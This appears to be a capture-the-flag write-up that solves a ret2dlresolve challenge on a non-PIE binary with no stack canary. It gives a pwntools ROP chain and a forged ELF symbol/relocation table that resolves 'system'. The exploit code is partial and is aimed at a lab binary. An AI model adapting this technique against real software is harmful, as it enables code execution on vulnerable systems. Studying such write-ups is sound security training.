# RET2DLRESOLVE

## Solution


Initially from the binary I can see that there is No PIE
```
/root/workspace/ret2dlresolve/chal.bin
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

I first started with finding and creating the fake addresses that I would need for the fake table addressing. I used Binary Ninja to find the addresses of the symbol and string table as well as the rela.plt. 

Once I had these I looked for a writeable memory address that would be able to hold the fake table. For this address, I used an address that was "outside" of the binary (not shown on Binary Ninja). Using this was possible since the paging for .bss section had to be a minimum of 0x100 bytes.

With all these values set, I looked for the gadgets that I would need to populate rdi. I had to use two gadgets with one popping r10 and the other moving r10 into rdi. I then called 'gets' again for the second chain to be received that would hold the fake table.

In the second part of the chain I had to populate rdi again and then called init_plt. The chain is shown below:

```
chain = cyclic(16)
chain += p64(ret)
chain += p64(pop_r10)                   # moves to r10 and then later rdi in next gadget
chain += p64(writeable_mem)             # writeable memory outside the binary
chain += p64(fini)                      # fini return
chain += p64(mov_rdi)                   # moves r10 to rdi
chain += p64(e.plt['gets'])

chain += p64(pop_r10)
chain += p64(fake_args)
chain += p64(fini)
chain += p64(mov_rdi)
chain += p64(init_plt)
chain += p64(dl_resolve_index)
```
The fake table that was created to hold 'system' entry is below:

```
payload = b'system\x00\x00'     # st_name 
payload += p64(0)               # st_info
payload += p64(0)               # st_other 
# Elf64 Symbol Struct
payload += p64(st_shndex)       # st_shndex 
payload += p64(0)               # st_value 
payload += p64(0)               # st_size 
payload += p64(0)               # padding
# Elf64_Rel Struct
payload += p64(writeable_mem)   # r_offset 
payload += p64(r_info)          # r_info 
payload += p64(0)               # padding
```